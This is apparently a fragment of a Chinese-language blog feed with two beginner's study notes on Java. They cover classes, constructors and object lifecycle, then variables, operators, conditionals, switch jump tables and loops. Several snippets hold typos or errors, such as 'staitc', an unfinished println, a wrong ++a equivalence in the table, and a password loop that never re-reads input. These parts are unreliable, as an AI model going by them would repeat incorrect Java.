<p>定义了类本身和定义了一个函数类似，本身不会做什么事情，不会分配内存，也不会执行代码。方法要执行需要被调用，而实例方法被调用，首先需要一个实例。实例也称为对象。</p>
<pre><code class="language-java">public staitc void main(String[] args){
    Point p = new Point();
    p.x = 2;
    p.y = 3;
    System.out.println(p.)
}
</code></pre>
<p>我们解释一下：</p>
<pre><code class="language-java">Point p = new Point();
</code></pre>
<p>这个语句包含了Point类型的变量声明和赋值，它可以分为两部分：</p>
<pre><code class="language-java">Point p;
p = new Point();
</code></pre>
<p>Point p声明了一个变量，这个变量叫p，是Point类型的。这个变量和数组变量是类似的，都有两块内存；一块存放实际内容，一块存放实际内容的位置。声明变量本身只会分配存放位置的内存空间，这块空间还没有指向任何实际内容。因为这种变量和数组本身不存储数据，而只是存储实际内容的位置，它们也都称为引用类型的变量。</p>
<p>p = new Point(); 创建了一个实例或对象，然后赋值给Point类型的变量p，它至少做了两件事：</p>
<ul>
<li>分配内存，以储存新对象的数据，对象数据包括这个对象的属性，具体包括其实例变量x和y。</li>
<li>给实例变量设置默认值，int类型默认值为0。</li>
</ul>
<p>与方法内定义的局部变量不同，在创建对象的时候，所有的实例变量都会分配一个默认值，这与创建数组的时候是类似的，数值类型变量的默认值是0，boolean是false，char是“\u0000”,引用类型变量都是null。null是一个特殊的值，表示不指向任何对象。</p>
<pre><code class="language-java">p.x = 2;
p.x = 3;
</code></pre>
<p>给对象的变量赋值，语法形式是：<code>&lt;对象变量名&gt;.&lt;成员名&gt;</code>。</p>
<pre><code class="language-java">System.out.println(p.distance());
</code></pre>
<p>调用实例方法distance，并输出结果，语句形式是：<code>&lt;对象变量名&gt;.&lt;方法名&gt;</code>。实例方法内对实例变量的操作，实际操作的就是p这个对象的数据。</p>
<p>我们在介绍基本类型的时候，先定义数据，然后赋值，最后是操作，自定义类型与此类似：</p>
<ul>
<li>Point p = new Point(); 是定义数据并设置默认值。</li>
<li>p.x = 2; p.y = 3; 是赋值。</li>
<li>p.distance()是数据的操作。</li>
</ul>
<p>可以看出，对实例变量和实例方法的访问都是通过对象进行，通过对象来访问和操作其内部的数据是一种基本的面向对象思维。本例中，我们通过对象直接操作了其内部数据x和y，这是一个不好的习惯，一般而言，不应该将实例变量声明为public，而只应该通过对象的方法对实例变量进行操作。</p>
<p><strong>变量默认值</strong></p>
<p>之前说过实例变量都有默认值，如果希望修改这个默认值，可以在定义变量的同时就赋值，或者将代码放入初始化代码块中，代码块用{}包围</p>
<pre><code class="language-java">int x = 1;
int y;
{
    y = 2;
}
</code></pre>
<p>x的默认值设为1，y的默认值设为2。在新建一个对象的时候，会先调用这个初始化，然后才会指向构造方法中的代码。</p>
<p>静态变量也可以这样初始化：</p>
<pre><code class="language-java">static int STATIC_ONE = 1;
static int STATIC_TWO;
static
{
    STATIC_TWO = 2;
}
</code></pre>
<p>STATIC_TWO = 2;语句外面包了一个static{}，这叫静态初始化代码块。静态初始化代码块在类加载的时候执行，这是在任何对象创建之前，且只执行一次。</p>
<p><strong>private变量</strong></p>
<p>前面说过一般不应该将实例变量声明为public，下面外面我们修改一下类的定义，将实例变量定义为private，通过实例方法来操作变量。</p>
<pre><code class="language-java">class Point{
    private int x;
    private int y;
    public void setX(int x){
        this.x = x;
    }
    public void setY(int y){
        this.y = y;
    }
    public int getX(){
        return x;
    }
    public int getY(){
        return y;
    }
    public double distance(){
        return Math.sqrt(x*x + y*y);
    }
}
</code></pre>
<p>这个定义中，我们加了4个方法，setX/setY用于设置实例变量的值，getX/getY用于获取实例变量的值。</p>
<p>这里需要介绍的是this这个关键字。this<strong>表示当前实例</strong>！在语句this.x = x;中，this.x表示实例变量x，而右边的x表示方法参数中的x。前面我们提到，在实例方法中，有一个隐含的参数，这个参数就是this，没有歧义的情况下，可以直接访问实例变量，在这个例子中，两个变量名都叫x，则需要通过加上this来消除歧义。</p>
<p>这4个方法看上去是非常多余的，直接访问变量不是更简洁吗？而且第一章我们也说过，函数调用是有成本的。在这个例子中，意义确实不太大，实际上，java编译器一般也会将这几个方法的调用转换为直接访问实例变量，而避免函数调用的开销。但很多情况下，通过函数调用可以封装内部数据，避免误操作。</p>
<p><strong>构造方法</strong></p>
<p>在初始化对象的时候，前面都是直接对每个变量赋值，有一个更简单方式对实例变量赋初值，就是构造方法，我们看如下代码，在Point类定义中增加如下代码：</p>
<pre><code class="language-java">public Point(){
    this(0,0);
}
public Point(int x, int y){
    this.x = x;
    this.y = y;
}
</code></pre>
<p>这两个就是构造方法，构造方法可以有多个。不同于一般方法，构造方法有一些特殊的地方：</p>
<ul>
<li>名称是固定的，与类名相同。这也容易理解，靠这个用户和java系统就都能容易地知道哪些是构造方法。</li>
<li>没有返回值，也不能有返回值。构造放啊隐含的返回值就是实例本身。</li>
</ul>
<p>与普通方法一样，构造方法也可以重载。第二个构造方法是比较容易理解的，使用this对实例变量赋值。</p>
<p>我们解释一下第一个构造方法，this(0,0)的意思是调用第二个构造方法，并传递参数“0,0”，我们前面解释说this表示当前实例，可以通过this访问实例变量，这是this的第二个用法，**用于在构造方法中调用其他构造方法。**这个this调用必须放在第一行，这个规定也是为了避免误操作。构造方法是用于初始化对象的，如果要调用别的构造方法，先调用别的，然后根据情况自己再做调整，而如果自己先初始化了一部分，再调别的，自己的修改可能就被覆盖了。</p>
<p>这个例子中，不带参数的构造方法通过this(0,0)又调用了第二个构造方法，这个调用是多余的，因为x和y的默认值就是0，不需要再单独赋值，这里主要是演示语法。使用构造方法的代码如下：</p>
<pre><code class="language-java">Point p = new Point(2,3);
</code></pre>
<p>这个调用就可以将实例变量x和y的值设为2和3。前面我们介绍new Point()的时候说，它至少做了两件事，一件是分配内存，另一件是给实例变量设置默认值，这里我们需要加上一件事，就是调用构造方法。调用构造方法是new操作的一部分。</p>
<p>通过构造方法，可以更为简洁地对实例变量进行赋值。关于构造方法，下面我们讨论两个细节：一个是默认构造方法；另一个是私有构造方法。</p>
<p>1.<strong>默认构造方法</strong></p>
<p>每个类都至少有一个构造方法，在通过new创建对象的过程中会被调用。但构造方法如果没什么操作要做，可以省略。java编译器会自动生成一个默认构造方法，也没有具体操作。但一旦定义了构造方法，java就不会再自动生成默认的，具体什么意思呢？在这个例子中，如果我们只定义了第二个构造方法（带参数），则下面语句：</p>
<pre><code class="language-java">Point p = new Point();
</code></pre>
<p>就会报错，因为找不到不带参数的构造方法。</p>
<p>为什么java有时候自动生成，有时候不生成呢？在没有定义任何构造方法的时候，java认为用户不需要，所以就生成一个空的以为被new过程调用；定义了构造方法的时候，java认为用户知道自己在干什么，认为用户是有意不想要不带参数的构造方法，所以不会自动生成。</p>
<p>2.<strong>私有构造方法</strong></p>
<p>构造方法可以是私有方法：即修饰器可以为private，为什么需要私有构造方法呢？大致有这么几种场景：</p>
<ul>
<li>不能创建类的实例，类只能被静态访问，如Math和Arrays类，它们的构造方法就是私有的。</li>
<li>能创建类的实例，但只能被类的静态方法调用。有一种常见的场景：类的对象有但只能有一个，即单例。在这种场景中，对象是通过静态方法获取的，而静态方法调用私有构造方法创建一个对象，如果对象已经创建过了，就重用这个对象。</li>
<li>至少用来被其他多个构造方法调用，用于减少重复代码。</li>
</ul>
<p><strong>类和对象的生命周期</strong></p>
<p>了解了类和对象的定义与使用，下面我们再从程序运行的角度理解类和对象的生命周期。</p>
<p>在程序运行的时候，当第一次通过new创建一个类的对象时，或者直接通过类名访问类变量和类方法时，java会将类加载进内存，为这个类分配一块空间，这个空间会包括类的定义、它的变量和方法信息，同时还有类的静态变量，并对静态变量赋初始值。</p>
<p>类加载进内存后，一般不会释放，直到程序结束。一般情况下，类只会加载一次，所以静态变量在内存中只有一份。</p>
<p>当通过new创建一个对象的时候，对象产生，在内存中，会存储这个对象的实例变量值，每做new操作一次，就会产生一个对象，就会有一份独立的实例变量。</p>
<p>每个对象除了保存实例变量的值外，可以理解为还保存着对应类型即类的地址，这样，通过对象能知道它的类，访问到类的变量和方法代码。</p>
<p>实例方法可以理解为一个静态方法，只是多了一个参数this。通过对象调用方法，可以理解为就是调用这个静态方法，并将对象作为参数传递给this。</p>
<p>对象的释放是被java用垃圾回收机制管理的，大部分情况下，我们不用太操心，当对象不再被使用的时候会被自动释放。</p>
<p>具体来说，对象和数组一样，有两块内存，保存地址的部分分配在栈中，而保存实际内容的部分分配在堆中。栈中的内存是自动管理的，函数调用入栈就会分配，而出栈就会释放。</p>
<p>堆中的内存是被垃圾回收机制管理的，当没有活跃变量指向对象的时候，对应的堆空间就可能被释放，具体释放时间是java虚拟机自己决定的。活跃变量就是已加载的类的类变量，以及栈中所有的变量。</p>
<p><strong>小结</strong></p>
<p>本节主要从自定义数据类型的角度介绍了类，谈了如何定义和使用类。自定义类型由类变量、类方法、实例变量和实例方法组成，为方便对实例变量赋值，介绍了构造方法，最后介绍了类和对象的生命周期。</p>
<p>通过类实现自定义数据类型，封装该类型的数据所具有的属性和操作，隐藏实现细节，从而在更高的层次（类和对象的层次，而非基本数据类型和函数的层次）上考虑和操作数据。</p>
<p>本节提到了多个关键字，汇总一下：</p>
<ul>
<li>public：可以修饰类、类方法、类变量、实例变量、实例方法、构造方法，表示可被外部访问。</li>
<li>private：可以修饰类、类方法、类变量、实例变量、实例方法、构造方法，表示不可以被外部访问，只能在类内部被使用。</li>
<li>static:修饰类变量和类方法，它也可以修饰内部类</li>
<li>this：表示当前实例，可以用于调用其他构造方法，访问实例变量，访问实例方法。</li>
<li>final：修饰类变量、实例变量，表示只能被赋值一次，也可以修饰实例方法和局部变量</li>
</ul>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[java编程基础(一)]]></title>
        <id>https://m1crofan.github.io/wzguACcqn/</id>
        <link href="https://m1crofan.github.io/wzguACcqn/">
        </link>
        <updated>2024-09-16T13:03:13.000Z</updated>
        <content type="html"><![CDATA[<h3 id="认识变量">认识变量</h3>
<p>对java而言，有如下基本数据类型</p>
<ul>
<li>整数：有4种整形byte/short/int/long；分别占1/2/4/8字节</li>
<li>小数：有两种类型float/double</li>
<li>字符类型：char，表示单个字符</li>
<li>真假类型：boolean，表示真假。</li>
</ul>
<p>基本数据类型都有对应的数组类型，<strong>数组表示固定长度的同种数据类型的多条记录</strong>，比如：一个字符可以用一个char类型数据表示，一段文字可以用一个char数组表示。</p>
<p>java是面向对象的语言，除了基本数据类型，其他都是对象类型。世界万物都是由元素周期表组成的，基本数据类型就相当于化学中的基本元素，而对象就相当于世间万物。</p>
<p>为了操作数据，需要把数据存放到内存中。所谓内存在程序看来就像是一块有地址编号的连续空间，数据放到内存中的某个位置后，为了方便地找到和操作这个数据，需要给这个位置起一个名字。编程语言通过变量这个概念来表示这个过程。</p>
<p>声明一个变量，比如<code>int a</code>，其实就是在内存中分配了一块空间，这块空间存放int数据类型，a指向这块内存空间所在的位置，通过对a操作即可操作a指向的内存空间。之所以叫“变”量，是因为它表示的是内存中的位置，这个位置存放的值是可以变的。</p>
<p>虽然变量的值可以变化，但变量的名字是不变的，这个名字应该<strong>表示程序员心目中这块内存空间所存储内容的意义</strong>，<strong>这个意义是不变的</strong>。</p>
<h3 id="赋值">赋值</h3>
<p>整型</p>
<p>声明变量之后，就在内存分配了一块位置，但这个位置的内容是位置的，赋值就是把这块位置的内容设为一个确定的值。</p>
<p>赋值形式很简单，直接把熟悉的数字常量形式赋值给变量即可，对应的内存空间的值就从未知变成了确定的常量。</p>
<pre><code class="language-java">byte b = 23;
short s = 3333;
int i = 9999;
long l = 32323;
</code></pre>
<p>但，在给long类型赋值时，如果常量超过了int的表示范围，需要在常量后面加大写或小写L，例如：</p>
<pre><code class="language-java">long a = 323234343433L;
</code></pre>
<p>小数类型</p>
<p>对于double，直接把小数表示赋值给变量就可</p>
<pre><code class="language-java">double d = 333.33;
</code></pre>
<p>但对于float，需要在数字后面加大写字母F或小写字母f,例如：</p>
<pre><code class="language-java">float f = 333.33f;
</code></pre>
<p>这是由于小数常量默认是double类型。</p>
<p>除了小数，也可以把整数直接赋值给double或float；这很好理解：整数是特殊的小数。</p>
<p>真假类型</p>
<pre><code class="language-java">boolean b = true;
b = false;
</code></pre>
<p>字符类型</p>
<p>字符类型char用于表示一个字符，char占内存空间两个字节。赋值时把常量字符用单引号括起来。</p>
<pre><code class="language-java">char c = 'A';
</code></pre>
<p>数组类型</p>
<p>基本类型的数组有3种赋值形式</p>
<pre><code class="language-java">int[] arr = {1,2,3};//当变量赋值
int[] arr = new int[] {1,2,3};//当对象赋值
</code></pre>
<pre><code class="language-java">int[] arr = new int[3];//先定好长度，后赋值。
arr[0] = 1;
arr[1] = 2;
arr[2] = 3;
</code></pre>
<p>第一种和第二种都是预先知道数组的内容，而第三种是先分配长度，然后再给每个元素赋值。第三种形式中，即使没有给每个元素赋值，每个元素也都有一个默认值，这个默认值跟数组类型有关，数值类型的值为0，boolean为false，char为空字符。</p>
<p>数组的长度可以动态确定</p>
<pre><code class="language-java">int length = ...;//根据一些条件动态计算
int arr = new int[length];
</code></pre>
<p>数组长度虽然可以动态确定，<strong>但定了之后就不可以变</strong>。数组有一个length属性，但只能读，不能更改。还有一个小细节，不能在给定初始值的同时给定长度，即如下格式是不允许的：</p>
<pre><code class="language-java">int[] arr = new int[3]{1,2,3};
</code></pre>
<p>可以这么理解，因为初始值已经决定了长度，再给个长度，如果还不一致，计算机将无所适从。</p>
<p>数组类型和基本类型有明显不同的，一个基本类型变量，内存中只会有一块对应的内存空间。但数组有两块：一块用于存储数组内容本身，另一块用于存储内容的位置。用一个例子来说明，有一个int变量a，以及一个int数组变量arr，其代码、变量对应的内存地址和内存内容如下所示：</p>
<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/m1crofan/image/main/image-20240916132530294.png" alt="image-20240916132530294" loading="lazy"></figure>
<p>基本类型a的内存地址是1000，这个位置存储的就是它的值100，数组类型arr的内存地址是2000，这个位置存储的值是一个位置3000，3000开始的位置存储的才是实际的数据“1，2，3”。</p>
<p>为什么数组要用两块要用两块空间？</p>
<pre><code class="language-java">int[] arrA = {1,2,3};
int[] arrB = {4,5,6,7};
arrA = arrB;
</code></pre>
<p>这段代码中，arrA初始长度是3X4个字节，arrB的初始长度是4X4个字节，后来将arrB的值赋给了arrA。如果arrA对应的内存空间是直接存储的数组内容，那么它将没有足够的空间去容纳arrB的所有元素。</p>
<p>用两块空间存储就简单得多，arrA存储的值就变成了和arrB的一样，存储的都是数组内容{4，5，6，7}<strong>的地址</strong>，此后访问arrA就和arrB是一样的了，而arrA{1，2，3}的内存空间由于不再被引用会进行垃圾回收。</p>
<p>由上也可以看出，给数组变量赋值和给数组中元素赋值是两回事，给数组中元素赋值是改变数组内容，而给数组变量赋值则会让变量指向一个不同的位置。</p>
<p>上面说数组的长度是不可以变的，不可变指的是数组的内容空间，一经分配，长度就不能再变了，但可以改变数组变量的值，它它指向一个长度不同的空间。</p>
<h3 id="基本运算">基本运算</h3>
<p>java中基本类型数据的主要运算有：</p>
<ul>
<li>算术运算：日常的加减乘除。</li>
<li>比较运算：日常的大小比较。</li>
<li>逻辑运算：针对布尔值进行运算。</li>
</ul>
<p>算数运算符有加、减、乘、除，符号分别是+、-、*、/，另外还有取模运算符%，以及自增（++）和自减（--）运算符。<strong>取模运算适用于整数和字符类型，其他算术运算适用于所有数值类型和字符类型</strong>。大部分运算都符合我们的数学常识。但，字符怎么也可以进行算术运算？这个后面会讲。</p>
<ul>
<li>减号用于两个数相减，也可以放在一个数前面用来表示负数。</li>
<li>取模(%)就是<strong>数学中的求余数</strong>，例如，5%3是2，10%9是1。</li>
<li>自增(++)和自减(--)，是一种快捷方式，是对自己进行加1或减1操作。</li>
</ul>
<p>加减乘除大部分情况和数学运算是一样的，都很容易理解，但有一些需要注意的地方，而自增、自减稍微复杂一些。</p>
<p>运算时要注意结果的范围，使用恰当的数据类型。两个整数都可以用int表示，但相乘的结果可能就会超出：</p>
<pre><code class="language-java">int a = 2147483647*2; //2147483647是int能表示的最大值
</code></pre>
<p>a的结果是-2。要避免这样的情况，我们的结果类型应使用long，但只改为long也是不够的，因为运算还是默认按照int类型进行，需要将至少一个数据表示为long形式，即在后面加L或l。</p>
<pre><code class="language-java">long a = 2147483647*2L;
</code></pre>
<p>另外，需要注意的是，整数相除不是四舍五入，而是直接舍去小数位</p>
<pre><code class="language-java">double d = 10/4;
</code></pre>
<p>结果是2而不是2.5，如果要按小数进行运算，需要将至少一个数表示为小数形式，或者使用强制类型转换，即在数字前面加(double),表示将数字看作double类型</p>
<pre><code class="language-java">double d = 10/4.0;
double d = 10/(double)4;
</code></pre>
<p>无论使用float还是double，进行运算时都会出现一些非常令人困惑的现象，比如：</p>
<pre><code class="language-java">float f = 0.1f*0.1f;
System.out.println(f);
</code></pre>
<p>这个结果看上去应该是0.01，但实际上，屏幕输出却是0.010000001，后面多了个1。换用double看看：</p>
<pre><code class="language-java">double d = 0.1*0.1;
System.out.println(d);
</code></pre>
<p>屏幕输出0.010000000000000002，一连串的0后多了个2。<strong>这是为什么呢？会在后面学习！</strong></p>
<p><strong>自增/自减</strong></p>
<p>自增/自减是对自己做加1减1操作，但每个都有两种形式，一种是放在变量后，例如a++、a--，另一种是放在变量前，例如++a、--a。</p>
<p>如果只是对自己操作，这两种形式没差，区别在于还有其他操作的时候。放在变量后(a++)是先用原来的值进行其他操作，再对自己进行修改，而放在变量前(++a)是先对自己修改，再用修改的值做其他操作。</p>
<table>
<thead>
<tr>
<th>快捷运算</th>
<th>等同运算</th>
</tr>
</thead>
<tbody>
<tr>
<td>b=a++-1</td>
<td>b=a-1 ; a=a+1</td>
</tr>
<tr>
<td>c=++a-1</td>
<td>a=a+1; c=a</td>
</tr>
<tr>
<td>arrA[i++]=arrB[++j]</td>
<td>j=j+1;arrA[i]=arrB[j];i=i+1</td>
</tr>
</tbody>
</table>
<p><strong>比较运算</strong></p>
<p>比较运算就是计算两个值之前的关系，结果是一个布尔类型的值。比较运算适用于所有数值类型和字符类型。</p>
<p>比较运算有大于(&gt;)、大于等于(&gt;=)、小于(&lt;)、小于等于(&lt;=)、等于(==)、不等于(!=)。</p>
<p>需要注意的是，对于数组，<strong>==判断的是两个变量指向的是不是同一个数组</strong>，而不是两个数组的元素内容是否一样，即使两个数组的内容一样，但如果两个不同的数组，==依然会返回false</p>
<pre><code class="language-java">int[] a = new int[] {1,2,3};
int[] b = new int[] {1,2,3};
//a==b 的结果是false
</code></pre>
<p>如果需要比较数组的内容是否一样，需要逐个比较里面存储的每个元素。</p>
<p><strong>逻辑运算</strong></p>
<ul>
<li>与(&amp;): 两个都为true才是true，只要有一个是false就是false。</li>
<li>或(|):只要有一个为true就是true，都是false才是false。</li>
<li>非(!): 针对一个变量，true会变成false，false会变成true。</li>
<li>异或(^): 两个相同为false，两个不同为true；</li>
<li>短路与(&amp;&amp;): 和&amp;类似</li>
<li>短路或(||): 与|类似</li>
</ul>
<p>逻辑运算的大部分都是比较直观的，需要注意的是&amp;和&amp;&amp;，以及|和||的区别。如果只是进行逻辑运算，它们也都是相同的，区别在于同时有其他操作的情况下</p>
<pre><code class="language-java">boolean a = true;
int b = 0;
boolean flag = a | b++ &gt;0;
</code></pre>
<p>因为a为true，所以flag也为true，但b的结果为1，因为|后面的式子也会进行运算，即使只看a已经知道flag的结果，还是会进行后面的运算。而||则不同，如果最后一句的代码是：</p>
<pre><code class="language-java">boolean flag = a || b++ &gt;0;
</code></pre>
<p>则b的值还是0， 因为||会“短路”，即再看到||前面部分就可以判定结果的情况下会忽略后面的运算。</p>
<p>那如果我们把a的值换成false呢？结果是false 0；还是false 1 ？</p>
<p>这个问题很有意思，结果是false 1；</p>
<pre><code class="language-java">boolean a = false;
int b = 0;
boolean flag = a || b++ &gt;0;
</code></pre>
<p>显然，当a不是false，就不会忽略后面的运算了；可后面不是++b，而是b++;即：先进行其他操作，再自增，所以结果是false 1。</p>
<pre><code class="language-java">boolean a = false;
int b = 0;
boolean flag = a || ++b &gt;0;
</code></pre>
<p>那么，这个返回什么呢？</p>
<p>答案：ture 、1。</p>
<p>因为这次是++b,先自增后进行其他操作。</p>
<h3 id="条件执行">条件执行</h3>
<p>流程控制中最基本的就是条件执行，一些操作只能在某些条件满足的情况下才执行，在一些条件下执行某些操作，在另一些条件下执行另外的操作。</p>
<p>java中表达条件执行的基本语法是if语句，它的语法是：</p>
<pre><code class="language-java">if(条件语句){
    代码块
}
</code></pre>
<p>或</p>
<pre><code class="language-java">if(条件语句) 代码;
</code></pre>
<p>表达的含义也非常简单，只有在条件语句为真的情况下，才执行后面的代码，为假就不执行了。具体来说，条件语句必须为布尔值，可以是一个直接的布尔变量，也可以是变量运算后的结果。如果条件语句为true，则执行括号{}中的代码，如果后面没有括号，则执行后面第一个分号；前的代码。</p>
<p>比如，只在变量为偶数的情况下输出：</p>
<pre><code class="language-java">int a = 10;
if(a%2 == 0){
    System.out.println(&quot;偶数&quot;)
}
</code></pre>
<p>或者：</p>
<pre><code class="language-java">int a = 10;
if(a%2==0) System.out.println(&quot;偶数&quot;)；
</code></pre>
<p>if实现的是条件满足的时候做什么操作，如果需要根据条件做分支，即满足的时候执行某种逻辑，而不满足的时候执行另一种逻辑，则可以用if/else</p>
<pre><code class="language-java">if(判断条件){
    代码块1
}else{
    代码块2
}
</code></pre>
<p>三元运算符的语法为：</p>
<pre><code class="language-java">判断条件 ? 表达式1 : 表达式2
</code></pre>
<p>三元运算符会得到一个结果，判断条件为真的时候就返回表达式1的值，否则就返回表达式2的值。三元运算符经常用于对某个变量赋值，例如求两个数的最大值：</p>
<pre><code class="language-java">int max = x &gt; y ? x:y;
</code></pre>
<p>三元运算符完全可以用if/else代替，但三元运算符的书写方式更简洁。</p>
<p>如果有多个判断条件，而且需要根据这些判断条件的组合执行某些操作，则可使用if / else if / else 语法如下：</p>
<pre><code class="language-java">if(条件1){
    代码块1
}else if(条件2){
    代码块2
}...
else if(条件n){
    代码块n
}else{
    代码块n+1
}
</code></pre>
<p>if / else if / else: 需要注意的是，判断顺序很重要，后面的判断<strong>只有在前面的条件为false的时候才会执行</strong>。</p>
<p>如下面这个代码：</p>
<pre><code class="language-java">if(score&gt;60){
    return &quot;及格&quot;;
}else if(score &gt;80){
    return &quot;良好&quot;;
}else{
    return &quot;优秀&quot;;
}
</code></pre>
<p>这段代码乍一看，似乎没什么问题；如果score是90，期望返回“优秀”，但实际只会返回“及格”。</p>
<p>在if /else if /else中，如果判断的条件基于的是同一个变量，只是根据变量值的不同而有不同的分支，如果值比较多，比如根据星期几进行判断，有7种可能性，或者根据英文字母进行判断，有26种可能性，使用if/ else if /else 比较繁琐，这种情况就可以使用switch：</p>
<pre><code class="language-java">switch(表达式){
    case 值1:
        代码1; break;
    case 值2:
        代码2; break;
    ...
    case 值n:
        代码n; break;
    default: 代码n+1
}
</code></pre>
<p>switch也比较简单，根据表达式的值执行不同的分支，具体来说，根据表达式的值找匹配的case，找到后执行后面的语句。**表达式值得数据类型只能是byte、short、int、char、枚举和String。**枚举和String后面会介绍。关键词break是指跳出switch语句，执行switch后面得语句。</p>
<p>从逻辑上讲，if/else 、 if/else if/else、三元运算符、switch都可以只用if代替，但使用不同得语句表达更简洁，在条件比较多的时候，switch从性能上看也更高。</p>
<p><strong>条件执行的实现原理</strong></p>
<p>条件执行具体是怎么实现的呢？程序最终都是一条条的指令，CPU有一个指令指示器，指向下一条要执行的指令，CPU根据指示器的指示加载指令并且执行。指令大部分是具体的操作和运算，在执行这些操作时，执行完一个操作后，指令指示器会自动指向挨着的下一条指令。</p>
<p>但有一些特殊的指令，称为跳转指令，这些指令会修改指令指示器的值，让CPU跳到一个指定的地方指向。跳转有两种：一种是条件跳转；一种是无条件跳转。条件跳转检查某个条件，满足则进行跳转，无条件跳转则是直接进行跳转。</p>
<p>if/else实际上会转换为这些跳转指令，比如：</p>
<pre><code class="language-java">int a = 10;
if (a%2 == 0)
{
    System.out.println(&quot;偶数&quot;);
}
//其他代码
</code></pre>
<p>抓换到的转移指令可能是：</p>
<pre><code class="language-java">int a = 10;
条件跳转：如果a%2==0，跳转到第四行
无条件跳转：跳转到第七行
{
    System.out.println(&quot;偶数&quot;);
}
//其他代码
</code></pre>
<p>你可能会奇怪第3行的无条件跳转指令，没有它不行吗？不行，没有这条指令，它会顺序执行接下来的指令，导致不管什么条件，括号中的代码都会执行。不过对应的跳转指令也可能是：</p>
<pre><code class="language-java">int a = 10;
条件跳转：如果a%2!= 0,跳转到第六行
{
    System.out.ptintln(&quot;偶数&quot;);
}
//其他代码
</code></pre>
<p>这里就没有无条件跳转指令，具体怎么对应和编译器实现有关。在单一if的情况下可能不用无条件跳转指令，但稍微复杂一些的情况都需要。if、if/else、if/else if/else、三元运算都会转换为条件跳转和无条件跳转，但swich不太一样。</p>
<p>switch的转换和具体系统系统实现有关，如果分支比较少，可能会转换为跳转指令。如果分支比较多，使用条件跳转会进行很多次的比较运算，效率比较低，可能会使用一种更为高效的方式，叫跳转表。跳转表是一个映射表，存储了可能的值以及要跳转到的地址。</p>
<table>
<thead>
<tr>
<th>条件值</th>
<th>跳转地址</th>
<th>条件值</th>
<th>跳转地址</th>
</tr>
</thead>
<tbody>
<tr>
<td>值1</td>
<td>代码块1的地址</td>
<td>...</td>
<td>...</td>
</tr>
<tr>
<td>值2</td>
<td>代码块2的地址</td>
<td>值n</td>
<td>代码块n的地址</td>
</tr>
</tbody>
</table>
<p>跳转表之所以高效，是因为其中的值必须为整数，且按大小顺序排序。按大小排序的整数可以使用高效的二分查找。如果值是连续的，则跳转表还会进行特殊优化，优化为一个数组，连找都不用找了，值就是数组的下标索引，直接根据值就可以找到跳转的地址。即使值不是连续的，但数字比较密集，差的不多，编译器也可能会优化为一个数组型的跳转表，没有的值指向default分支。</p>
<p>程序源代码中的casr值排列不要求是排序的，编译器会自动排序。之前说switch值的类型可以是byte、short、int、char、枚举和string。其中byte/short/int本来就是整数，char本质上也是整数，而枚举类型也有对应的整数（这个后面会学），String用于switch时也会转换为整数。不可以使用long，因为跳转表值得存储空间为32位，容不下long。简单说明下String，String是通过hashCode方法转换为整数的，但不同String的hashCode可能相同，跳转后会再次根据String的内容进行比较判断。</p>
<p><strong>循环</strong></p>
<p>在java中，循环有四种形式，分别是while、do/while、for和foreach，下面分别介绍</p>
<p>while的语句</p>
<pre><code class="language-java">while(条件语句){
    代码块
}
</code></pre>
<p>while和if的语法很像，只是把if换成了while，它表达的含义也非常简单，只要条件语句为真，就一直执行后面的代码，为假就停止不做了。比如</p>
<pre><code class="language-java">Scanner reader = new Scanner(System.in);
System.out.println(&quot;please input password&quot;);
int num = reader.nextInt();
int password = 6789;
while(num!=password){
    System.out.println(&quot;please input password&quot;);
}
System.out.println(&quot;correct&quot;);
reader.close();
</code></pre>
<p>以上代码中，我们使用类型为Scanner的reader变量从屏幕控制台接收数字，reader.nextInt()从屏幕接收一个数字，如果数字不是6789，就一直提示输入，否则跳出循环。</p>
<p>while循环中，代码块中会有影响循环中断或退出的条件，但经常不知道什么时候循环会中断或退出。</p>
<p>do/while</p>
<p>不管条件语句是什么，代码块都会至少执行一次</p>
<pre><code class="language-java">do{
    代码块;
}while(条件语句)
</code></pre>
<p>for</p>
<p>实际中应用最为广泛的循环语法可能是for了，尤其是在循环次数已知的情况。语法为：</p>
<pre><code class="language-java">for(初始化语句;循环条件;步进操作){
    循环体
}
</code></pre>
<p>for后面的括号中有两个分号；分隔了三条语句。除了循环条件必须返回一个boolean类型外，其他语句没有什么要求，但通常情况下第一条语句用于初始化，尤其是循环的索引变量，第三条语句修改循环变量，一般是步进，即递增或递减索引变量，循环体是在循环中执行的语句。</p>
<p>它的执行流程如下：</p>
<ol>
<li>执行初始化指令；</li>
<li>检查循环条件是否为true，如果为false，则跳转到第六步；</li>
<li>循环条件为真，执行循环体；</li>
<li>执行步进操作；</li>
<li>步进操作执行完后，跳转到第二步，即继续检查循环条件；</li>
<li>for循环后面的语句；</li>
</ol>
<p>下面是一个简单的for循环</p>
<pre><code class="language-java">int[] arr = {1,2,3,4};
for(int i=0; i&lt;arr.length; i++){
    System.out.println(arr[i]);
}
</code></pre>
<p>顺序打印数组中的每个元素，初始化语句初始化索引i为0，循环条件为索引雄安与数组长度，步进操作为递增索引i，循环体打印数组元素。</p>
<p>在for中，每条语句都是可以为空的，也就是</p>
<pre><code class="language-java">for( ; ; ){}
</code></pre>
<p>是有效的，这是一个死循环。注意:可以省略语句，但分号不能省。</p>
<p>foreach</p>
<p>我们来看一个foreach的例子</p>
<pre><code class="language-java">int[] arr = {1,2,3,4};
for(int element : arr){
    System.out.println(element);
}
</code></pre>
<p>foreach不是一个关键字，它使用冒号：，冒号前面是循环中的每个元素，包括数据类型和变量名称，冒号后面是要遍历的数组或集合，每次循环element都会自动更新。对于不需要使用索引变量，只是简单遍历的情况，foreach语法上会更简洁。</p>
<p>在循环中，会以循环条件作为是否结束的依据，但有时可能会需要根据别的条件提前结束循环或跳过一些代码，这时候可以使用break或continue关键字对循环进行控制。</p>
<p>break</p>
<p>break用于提前结束循环。比如，在一个数组中查找某个元素时，循环条件可能是到数组结束，但如果找到了元素，可能就会想提前结束循环，这时候就可以使用break。</p>
<pre><code class="language-java">int[] arr = ...; //在该数组中查找元素
int toSearch = 100; //要查找的元素
int i = 0;
for(;i&lt;arr.length;i++){
    if(arr[i]==toSearch){
        break;
    }
}
if(i!=arr.length){
    System.out.println(&quot;found&quot;);
}else{
    System.out.println(&quot;not found&quot;);
}
</code></pre>
<p>continue</p>
<pre><code class="language-java">int[] arr = ... //在该数组中查找元素
int toSearch = 2; //要查找的元素
int count = 0;
for(int i=0; i&lt;arr.length; i++){
    if(arr[i] != toSearch){
        continue;
    }
    count++;
}
System.out.println(&quot;found count&quot;+count);
</code></pre>
